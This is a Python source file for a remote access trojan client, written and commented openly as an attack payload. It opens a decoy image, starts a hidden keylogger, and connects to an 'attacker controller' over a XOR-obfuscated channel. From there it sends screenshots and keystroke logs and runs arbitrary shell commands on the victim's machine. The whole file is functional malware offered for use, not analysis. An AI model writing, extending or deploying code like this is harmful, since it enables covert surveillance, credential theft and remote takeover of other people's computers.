import socket
import json
import os
import sys
import time
import threading
import hashlib
import base64
import io
import subprocess
from pynput.keyboard import Listener
from PIL import ImageGrab

# --- Connection Settings ---
SERVER_HOST = "127.0.0.1"  # Set attacker controller IP address
SERVER_PORT = 8080

# Pre-shared 8-bit XOR key for payload obfuscation (must match server)
KEY = b'simple_xor_key'

# Lock mechanism for thread-safe log file access
log_lock = threading.Lock()

# Set current working directory to script path
try:
    script_dir = os.path.dirname(os.path.abspath(__file__))
    if script_dir:
        os.chdir(script_dir)
except Exception:
    pass


def xor_crypt(data: bytes) -> bytes:
    """Applies symmetric XOR encryption/decryption using static key."""
    return bytes(b ^ KEY[i % len(KEY)] for i, b in enumerate(data))


def send_msg(sock: socket.socket, obj: dict):
    """Encodes JSON payload, encrypts with XOR, and prepends 4-byte length header."""
    try:
        raw = json.dumps(obj).encode('utf-8')
        enc = xor_crypt(raw)
        length = len(enc).to_bytes(4, 'big')
        sock.sendall(length + enc)
    except Exception:
        pass


def recv_msg(sock: socket.socket) -> dict:
    """Reads 4-byte length header prefix and decrypts full JSON binary frame."""
    length_bytes = sock.recv(4)
    if not length_bytes:
        raise ConnectionError("C2 connection terminated.")
    length = int.from_bytes(length_bytes, 'big')
    data = b''
    while len(data) < length:
        chunk = sock.recv(length - len(data))
        if not chunk:
            raise ConnectionError("Stream interrupted while receiving payload.")
        data += chunk
    dec = xor_crypt(data)
    return json.loads(dec.decode('utf-8', errors='replace'))


def handle_screencap(sock: socket.socket):
    """Captures primary desktop screen and returns JPEG encoded in base64 format."""
    try:
        screenshot = ImageGrab.grab()
        buffer = io.BytesIO()
        screenshot.save(buffer, format="JPEG")
        img_str = base64.b64encode(buffer.getvalue()).decode()
        send_msg(sock, {"result": "[+] Screenshot captured!", "data": img_str})
    except Exception as e:
        send_msg(sock, {"result": f"[-] Screenshot failed: {e}"})


def handle_hash(sock: socket.socket, filename: str):
    """Computes SHA-256 hash checksum for requested local file."""
    try:
        target = filename if filename else "logs.txt"
        if not os.path.exists(target):
            send_msg(sock, {"result": f"[-] Error: {target} not found."})
            return
        
        h = hashlib.sha256()
        with log_lock:
            with open(target, "rb") as f:
                for chunk in iter(lambda: f.read(4096), b""):
                    h.update(chunk)
        send_msg(sock, {"result": f"[+] SHA256 ({target}): {h.hexdigest()}"})
    except Exception as e:
        send_msg(sock, {"result": f"[-] Hash error: {str(e)}"})


def start_keylogger():
    """Asynchronous keylogger recording key strokes to logs.txt in thread-safe mode."""
    def on_press(key):
        with log_lock:
            with open("logs.txt", "a", encoding="utf-8") as f:
                f.write(f"{key} ")

    with Listener(on_press=on_press) as listener:
        listener.join()


def execute_command(cmd: str) -> str:
    """Executes arbitrary OS shell command and returns output."""
    try:
        output = subprocess.check_output(cmd, shell=True, stderr=subprocess.STDOUT)
        return output.decode('utf-8', errors='replace')
    except subprocess.CalledProcessError as e:
        return e.output.decode('utf-8', errors='replace')
    except Exception as e:
        return str(e)


def connect_c2():
    """Main client connection loop with automatic reconnect logic."""
    # Launch decoy image if present
    if os.path.exists("image.jpg"):
        try:
            os.startfile("image.jpg")
        except Exception:
            pass

    # Start background keylogger thread
    threading.Thread(target=start_keylogger, daemon=True).start()

    while True:
        try:
            sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            sock.connect((SERVER_HOST, SERVER_PORT))

            while True:
                msg = recv_msg(sock)
                action = msg.get("action", "")

                if action == "screencap":
                    handle_screencap(sock)
                elif action == "keylog":
                    with log_lock:
                        if os.path.exists("logs.txt"):
                            with open("logs.txt", "r", encoding="utf-8", errors="replace") as f:
                                logs = f.read()
                            send_msg(sock, {"result": f"\n[Logs]:\n{logs}"})
                        else:
                            send_msg(sock, {"result": "[-] No log file found."})
                elif action == "hash":
                    handle_hash(sock, msg.get("filename", "logs.txt"))
                elif action == "terminate":
                    send_msg(sock, {"result": "[+] Terminating payload process."})
                    sock.close()
                    sys.exit(0)
                elif action:
                    out = execute_command(action)
                    send_msg(sock, {"result": out})

        except Exception:
            time.sleep(5)


if __name__ == "__main__":
    connect_c2()
